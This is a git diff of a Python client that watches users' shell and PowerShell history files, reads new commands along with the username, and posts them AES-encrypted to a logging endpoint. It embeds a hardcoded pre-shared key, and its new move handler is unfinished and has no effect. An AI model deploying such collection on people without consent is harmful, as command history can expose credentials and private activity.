@@ -4,15 +4,17 @@ from watchdog.observers import Observer
 import requests
 import subprocess
 from collections import Counter
+from pathlib import Path
 import os
 import time
 import socket
 import getpass
 import base64
 import json
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.primitives import padding
-from cryptography.hazmat.backends import default_backend
+# from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+# from cryptography.hazmat.primitives import padding
+# from cryptography.hazmat.backends import default_backend
+from client_utils import encrypt_payload
 # import difflib
 # add 
 # certin powershell history settings 
@@ -23,7 +25,7 @@ username = getpass.getuser()
 #example PSK
 PSK = "0feNcM1h9Cx2mWAopX6Rq8WZ9sHUvQG4TthfgCL2lk0="
 
-
+# other_logger_paths = ""
 
 class FileChecking(FileSystemEventHandler):
     def __init__(self):
@@ -63,15 +65,34 @@ class FileChecking(FileSystemEventHandler):
                 print(f"* Error getting size for {path}: {e}")
                 self.file_positions[path]=0
 
-            with open(path,"r", encoding="utf-8",errors="replace") as user_con_history:
+            with open(path,"r", encoding="utf-8",errors="replace") as user_con_history:# unessacary? 
                 self.history_files[path] = user_con_history.readlines()
-
+    def on_moved(self, event: FileSystemEvent):
+        if event.is_directory:
+            source_path = Path(os.path.normpath(event.src_path))
+            for path in self.history_paths:
+                path = Path(path)
+                is_sub = path.is_relative_to(source_path)
+                if is_sub:
+                    # diff the path with the new destination path
+                    trailing_path = path.relative_to(source_path)
+                    new_path = Path(os.path.normpath(event.dest_path))
+                    # check if this works
+                    path = new_path / trailing_path 
+        pass
+        
+        # if event.is_directory:
+            # check if its history paths
+            # change history paths
+        # (its a file), change the file the history path is pointing to. 
         
     def on_modified(self, event: FileSystemEvent):
         print("file event:")
+        norm_path = os.path.normpath(event.src_path)
+        # if normpath 
         if event.is_directory:
             return
-        norm_path = os.path.normpath(event.src_path)
+        
         print(norm_path)
         # if norm_path == self.static_path:
         if norm_path in self.history_paths:
@@ -186,20 +207,20 @@ def post_log(endpoint, payload):
 def _get_key() -> bytes:
     return base64.b64decode(PSK)
 
-def encrypt_payload(data: dict) -> str:
+# def encrypt_payload(data: dict) -> str:
 
-    plaintext = json.dumps(data).encode("utf-8")
+#     plaintext = json.dumps(data).encode("utf-8")
 
-    # PKCS7 padding
-    padder = padding.PKCS7(128).padder()
-    padded = padder.update(plaintext) + padder.finalize()
+#     # PKCS7 padding
+#     padder = padding.PKCS7(128).padder()
+#     padded = padder.update(plaintext) + padder.finalize()
 
-    iv = os.urandom(16)
-    cipher = Cipher(algorithms.AES(_get_key()), modes.CBC(iv), backend=default_backend())
-    encryptor = cipher.encryptor()
-    ciphertext = encryptor.update(padded) + encryptor.finalize()
+#     iv = os.urandom(16)
+#     cipher = Cipher(algorithms.AES(_get_key()), modes.CBC(iv), backend=default_backend())
+#     encryptor = cipher.encryptor()
+#     ciphertext = encryptor.update(padded) + encryptor.finalize()
 
-    return base64.b64encode(iv + ciphertext).decode("ascii")
+#     return base64.b64encode(iv + ciphertext).decode("ascii")
 
 def main():
     # print(get_history_paths())
@@ -207,6 +228,7 @@ def main():
     checker = FileChecking()
     observer = Observer()
     # observer.schedule(checker, checker.static_dir)
+    # check if other instances are running
     for dir in checker.history_dirs:
         observer.schedule(checker, dir)
     observer.start()
